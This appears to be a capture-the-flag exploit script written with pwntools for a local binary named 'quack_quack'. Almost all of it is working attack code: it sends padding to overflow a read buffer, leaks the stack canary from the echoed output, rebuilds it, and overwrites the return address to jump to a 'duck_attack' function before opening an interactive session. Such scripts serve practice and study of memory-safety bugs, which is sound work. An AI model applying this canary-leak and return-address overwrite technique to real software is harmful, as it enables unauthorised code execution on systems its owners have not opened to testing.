#!/usr/bin/python3

from pwn import *
from sys import argv
"""

"""

# read(0,&Buffer,0x66);
# here we have the size desired
# so giving that, we need to check the complet minus len("Quack Quack ")
# 0x66 => 102
# len("Quack Quack ") => 12
offset = 89
offset_data = b'A'*offset
proc = process("./quack_quack")
data = offset_data + b'Quack Quack '

info = proc.sendafter(b">", data)
proc.recvuntil(b'Quack Quack ')

x = proc.recvuntil(b" ready to fight the Duck?", drop=True)
print(x[:7])


print(len(x))

print(x)
# ❯ objdump -D quack_quack | grep "attack"
# 000000000040137f <duck_attack>:
#   4013ba:       79 31                   jns    4013ed <duck_attack+0x6e>
#   401406:       7f cd                   jg     4013d5 <duck_attack+0x56>
#   401420:       74 05                   je     401427 <duck_attack+0xa8>
exploit = b'A'*(offset - 1 )
exploit += p64(u64(b'\x00' + x[:7]))
duck_attack = p64(0x0040137f)
exploit += p64(0)
exploit += duck_attack
proc.sendline(exploit)
proc.interactive()
